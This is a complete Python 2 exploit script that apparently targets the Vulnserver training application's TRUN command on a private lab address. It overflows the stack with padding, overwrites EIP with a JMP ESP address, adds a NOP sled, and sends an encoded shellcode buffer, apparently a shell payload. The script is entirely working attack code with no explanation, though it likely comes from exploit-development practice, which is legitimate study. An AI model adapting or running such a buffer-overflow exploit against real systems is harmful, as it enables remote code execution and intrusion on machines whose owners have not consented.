import time
import socket
ip = '192.168.196.147'
port = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
print "Connecting to Server..."
time.sleep(0.75)
print s.recv(1024)
junk = 'A' * 2006 
EIP = "\xaf\x11\x50\x62" #JMP ESP
nops = "\x90" * 20 #nops sled

buf =  b""
buf += b"\xb8\xa6\xf0\x5d\x3d\xd9\xc8\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x52\x31\x45\x12\x03\x45\x12\x83\x63\xf4\xbf"
buf += b"\xc8\x97\x1d\xbd\x33\x67\xde\xa2\xba\x82\xef\xe2\xd9"
buf += b"\xc7\x40\xd3\xaa\x85\x6c\x98\xff\x3d\xe6\xec\xd7\x32"
buf += b"\x4f\x5a\x0e\x7d\x50\xf7\x72\x1c\xd2\x0a\xa7\xfe\xeb"
buf += b"\xc4\xba\xff\x2c\x38\x36\xad\xe5\x36\xe5\x41\x81\x03"
buf += b"\x36\xea\xd9\x82\x3e\x0f\xa9\xa5\x6f\x9e\xa1\xff\xaf"
buf += b"\x21\x65\x74\xe6\x39\x6a\xb1\xb0\xb2\x58\x4d\x43\x12"
buf += b"\x91\xae\xe8\x5b\x1d\x5d\xf0\x9c\x9a\xbe\x87\xd4\xd8"
buf += b"\x43\x90\x23\xa2\x9f\x15\xb7\x04\x6b\x8d\x13\xb4\xb8"
buf += b"\x48\xd0\xba\x75\x1e\xbe\xde\x88\xf3\xb5\xdb\x01\xf2"
buf += b"\x19\x6a\x51\xd1\xbd\x36\x01\x78\xe4\x92\xe4\x85\xf6"
buf += b"\x7c\x58\x20\x7d\x90\x8d\x59\xdc\xfd\x62\x50\xde\xfd"
buf += b"\xec\xe3\xad\xcf\xb3\x5f\x39\x7c\x3b\x46\xbe\x83\x16"
buf += b"\x3e\x50\x7a\x99\x3f\x79\xb9\xcd\x6f\x11\x68\x6e\xe4"
buf += b"\xe1\x95\xbb\xab\xb1\x39\x14\x0c\x61\xfa\xc4\xe4\x6b"
buf += b"\xf5\x3b\x14\x94\xdf\x53\xbf\x6f\x88\x9b\xe8\xab\xce"
buf += b"\x74\xeb\x33\xce\x3f\x62\xd5\xba\x2f\x23\x4e\x53\xc9"
buf += b"\x6e\x04\xc2\x16\xa5\x61\xc4\x9d\x4a\x96\x8b\x55\x26"
buf += b"\x84\x7c\x96\x7d\xf6\x2b\xa9\xab\x9e\xb0\x38\x30\x5e"
buf += b"\xbe\x20\xef\x09\x97\x97\xe6\xdf\x05\x81\x50\xfd\xd7"
buf += b"\x57\x9a\x45\x0c\xa4\x25\x44\xc1\x90\x01\x56\x1f\x18"
buf += b"\x0e\x02\xcf\x4f\xd8\xfc\xa9\x39\xaa\x56\x60\x95\x64"
buf += b"\x3e\xf5\xd5\xb6\x38\xfa\x33\x41\xa4\x4b\xea\x14\xdb"
buf += b"\x64\x7a\x91\xa4\x98\x1a\x5e\x7f\x19\x2a\x15\xdd\x08"
buf += b"\xa3\xf0\xb4\x08\xae\x02\x63\x4e\xd7\x80\x81\x2f\x2c"
buf += b"\x98\xe0\x2a\x68\x1e\x19\x47\xe1\xcb\x1d\xf4\x02\xde"
s.send(('TRUN .' + junk + EIP + nops + buf + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
